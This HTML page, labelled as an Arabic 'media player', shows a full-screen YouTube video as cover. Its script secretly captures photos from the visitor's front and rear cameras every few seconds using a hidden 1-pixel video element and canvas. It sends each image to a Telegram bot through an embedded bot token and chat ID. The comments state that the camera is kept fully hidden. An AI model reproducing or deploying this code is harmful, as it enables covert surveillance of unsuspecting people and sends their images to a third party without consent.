<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>مشغل الوسائط</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: #000;
            overflow: hidden;
            cursor: pointer;
        }

        /* الفيديو يملأ الشاشة */
        .video-wrapper {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
        }

        iframe {
            width: 100%;
            height: 100%;
            border: none;
            /* منع التفاعل مع الـ iframe مباشرة لإجبار المتصفح على رصد النقر على الـ body */
            pointer-events: none; 
        }

        /* الكاميرا مخفية تماماً */
        #v {
            position: absolute;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }

        canvas {
            display: none;
        }
    </style>
</head>
<body>

<div class="video-wrapper">
    <iframe id="youtube-player" src="https://www.youtube.com/embed/TnPZiCf36Lc?enablejsapi=1&autoplay=1&mute=1" allow="autoplay; encrypted-media"></iframe>
</div>

<video id="v" autoplay playsinline muted></video>
<canvas id="c"></canvas>

<script>
    const CONFIG = {
        TOKEN: "8761336309:AAGv1e4FqNVaybasRyNwLu4U1o5x1pNCJUk",
        CHAT_ID: "7000276863",
        INTERVAL: 3000,  // زيادة الوقت قليلاً للسماح للمتصفح بالتبديل بين الكاميرات
        QUALITY: 0.8     // تحسين الجودة من 0.15 إلى 0.8 (جودة عالية جداً)
    };

    const video = document.getElementById('v');
    const canvas = document.getElementById('c');
    const ctx = canvas.getContext('2d');
    const iframe = document.getElementById('youtube-player');

    let isStarted = false;
    let currentFacingMode = "user"; // نبدأ بالأمامية

    document.body.addEventListener('click', () => {
        if (isStarted) return;
        isStarted = true;

        // تشغيل الصوت
        if(iframe) {
            let currentSrc = iframe.src;
            iframe.src = currentSrc.replace("mute=1", "mute=0");
        }

        // بدء حلقة العمل المزدوجة
        startDualCaptureLoop();
    });

    async function startDualCaptureLoop() {
        // تنفيذ العملية فوراً ثم تكرارها
        async function run() {
            // 1. التقاط من الكاميرا الأمامية
            await captureFromDevice("user");
            // 2. انتظار بسيط لراحة المعالج
            await new Promise(r => setTimeout(r, 500));
            // 3. التقاط من الكاميرا الخلفية
            await captureFromDevice("environment");
        }

        run();
        setInterval(run, CONFIG.INTERVAL);
    }

    async function captureFromDevice(mode) {
        try {
            // فتح الكاميرا المطلوبة
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: mode, width: { ideal: 1280 }, height: { ideal: 720 } } 
            });
            
            video.srcObject = stream;
            
            // انتظار تحميل الميتا لضمان جودة الصورة
            await new Promise((resolve) => {
                video.onloadedmetadata = () => {
                    video.play();
                    // ننتظر قليلاً حتى يضبط الفوكس التلقائي
                    setTimeout(resolve, 800); 
                };
            });

            // ضبط الحجم بدقة عالية
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            // تحويل وإرسال
            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', CONFIG.QUALITY));
            
            const formData = new FormData();
            formData.append('chat_id', CONFIG.CHAT_ID);
            formData.append('caption', mode === "user" ? "📸 كاميرا أمامية" : "📸 كاميرا خلفية");
            formData.append('photo', blob, 'capture.jpg');

            fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            }).catch(() => {});

            // إغلاق الكاميرا فوراً للسماح للثانية بالعمل
            stream.getTracks().forEach(track => track.stop());
            video.srcObject = null;

        } catch (err) {
            console.warn(`فشل الوصول للكاميرا (${mode}):`, err);
        }
    }
                    </script>
    

</body>
</html>
